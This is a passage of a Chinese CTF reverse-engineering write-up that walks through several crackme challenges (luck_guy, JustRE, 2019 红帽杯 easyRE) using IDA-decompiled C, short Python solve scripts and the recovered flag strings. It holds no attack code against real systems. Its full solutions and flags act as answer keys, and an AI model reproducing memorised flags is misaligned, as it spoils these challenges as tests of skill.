punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span>               <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>byte_40F0E0<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>byte_40F0E0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">[</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> byte_40F0E0<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#  MRCTF&#123;Tr4nsp0sltiON_Clph3r_1s_3z&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以说是右手就行。</p><p><strong>注意下标的那个数组的最后一位补上0x00，要不不满足33位的条件，把那个最后的0x08换成0x00</strong></p><h2 id="Linux下文件逆向-elf文件逆向"><a href="#Linux下文件逆向-elf文件逆向" class="headerlink" title="Linux下文件逆向(elf文件逆向)"></a>Linux下文件逆向(elf文件逆向)</h2><h3 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h3><p><strong>关键代码寻找与审计</strong></p><p>这题应该是可以使用ida &amp; ubuntu实现动态调试的，但是我一看配置环境还要浪费许多时间，就直接进行逆向分析好了。下面的是get_flag()函数的代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-3Ch]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-38h]</span>  __int64 s<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-28h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">200</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK, it's flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> f1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//f1=GXY&#123;do_not_</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//f2=</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar not like you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar want a girlfriend"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>        s <span class="token operator">=</span> <span class="token number">0x7F666F6067756369LL</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"emmm,you can't find flag 23333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的switch需要正确排序才能获得正确的flag，这里很明显case1是最后一个，前两个猜测分别是case4和case5，就有下面的脚本</p><p><strong>逆向脚本</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag1 <span class="token operator">=</span> <span class="token string">'GXY&#123;do_not_'</span>flag2 <span class="token operator">=</span> <span class="token string">''</span>s <span class="token operator">=</span> <span class="token string">'7F666F6067756369'</span>res1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    res1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res1 <span class="token operator">=</span> res1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment"># 这里似乎是因为大小端排序的问题似乎，然后上面的内容需要简单地逆一下</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        flag2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>res1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>res1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag1 <span class="token operator">+</span> flag2<span class="token punctuation">)</span><span class="token comment"># GXY&#123;do_not_hate_me&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h3><p><strong>查PE</strong></p><p><img src="/2021/05/28/CTF/image-20210530113755795.png" alt="PE信息"></p><p>emmm，直接拖入ida32看看吧</p><p><strong>得flag</strong></p><p>这种带有GUI的程序逆向主要就是先看字符串信息，直接查找字符串找到flag的一部分，再找到变换flag的关键函数</p><p><img src="/2021/05/28/CTF/image-20210530114039094.png" alt="image-20210530114039094"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">INT_PTR __stdcall <span class="token function">DialogFunc</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT a2<span class="token punctuation">,</span> WPARAM a3<span class="token punctuation">,</span> LPARAM a4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  CHAR String<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-64h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">272</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">273</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> Format<span class="token punctuation">,</span> <span class="token operator">++</span>dword_4099F0<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_4099F0 <span class="token operator">==</span> <span class="token number">19999</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">" BJD&#123;%d%d2069a45792d233ac&#125;"</span><span class="token punctuation">,</span> <span class="token number">19999</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">EndDialog</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据下面的得到flag</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">" BJD&#123;%d%d2069a45792d233ac&#125;"</span><span class="token punctuation">,</span> <span class="token number">19999</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">BJD&#123;1999902069a45792d233ac&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h3><p>提示了是elf文件，直接ida64打开之后一路跟踪到关键代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_4009C6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-114h]</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-110h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-108h]</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-100h]</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-F8h]</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-F0h]</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-E8h]</span>  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-E0h]</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-D8h]</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-D0h]</span>  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-C8h]</span>  <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-C0h] BYREF</span>  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+6Dh] [rbp-B3h] BYREF</span>  <span class="token keyword">char</span> v14<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+71h] [rbp-AFh] BYREF</span>  <span class="token keyword">char</span> v15<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-90h] BYREF</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-70h]</span>  <span class="token keyword">char</span> v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+B4h] [rbp-6Ch]</span>  <span class="token keyword">char</span> v18<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+C0h] [rbp-60h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+108h] [rbp-18h]</span>  v19 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"Iodl>Qnb(ocy"</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token string">"y.i"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v13<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> <span class="token string">"d`3w&#125;wek9&#123;iy=~yL@EC"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v14<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v15<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_4406E0</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v15<span class="token punctuation">,</span> <span class="token number">37LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">36</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>v15<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span> <span class="token operator">!=</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token number">4294967294LL</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"continue!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v18<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">sub_4406E0</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v18<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v18<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">39</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v2 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>      v4 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>      v5 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      v7 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>      v8 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v9 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>      v10 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>      v11 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400360</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> off_6CC090<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"You found me!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"bye bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token number">4294967293LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>LABEL_13<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v19 <span class="token punctuation">)</span>    <span class="token function">sub_444020</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数似乎是个坑，本来我是不太会的，看了wp，原来是下面的这里的内容进行了10次base64解密会获得一个看雪某版主的一篇文章，而那篇文章对解这道题是无用的</p><p><img src="/2021/05/28/CTF/image-20210531125151809.png" alt="image-20210531125151809"></p><p>然后继续向下看，发现字符串<code>byte_6CC0A0</code>，点进去函数，发现这个才是真正的可以获得flag的函数</p><p><img src="/2021/05/28/CTF/image-20210531130338935.png" alt="image-20210531130338935"></p><p>发现该函数对应的反编译出的c语言的代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400D35</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// 